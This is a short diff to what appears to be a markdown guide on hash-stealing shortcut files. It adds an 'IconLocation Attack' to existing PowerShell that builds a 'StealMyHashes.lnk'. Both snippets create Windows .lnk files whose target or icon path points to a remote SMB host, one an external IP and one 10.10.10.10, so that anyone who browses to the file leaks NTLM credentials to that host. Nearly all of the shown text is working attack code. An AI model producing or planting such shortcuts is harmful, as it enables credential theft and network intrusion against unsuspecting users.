@@ -255,6 +255,7 @@ sc.Save
 The Powershell version.
 
 ```powershell
+#TargetPath attack
 $objShell = New-Object -ComObject WScript.Shell
 $lnk = $objShell.CreateShortcut("StealMyHashes.lnk")
 $lnk.TargetPath = "\\35.164.153.224\@OsandaMalith"
@@ -263,6 +264,12 @@ $lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
 $lnk.Description = "I will Steal your Hashes"
 $lnk.HotKey = "Ctrl+Alt+O"
 $lnk.Save()
+
+#IconLocation Attack
+$wsh = new-object -ComObject wscript.shell
+$shortcut = $wsh.CreateShortcut("\\dc\software\test.lnk")
+$shortcut.IconLocation = "\\10.10.10.10\test.ico"
+$shortcut.Save()
 ```
 
 ## Internet Shortcuts (.url)
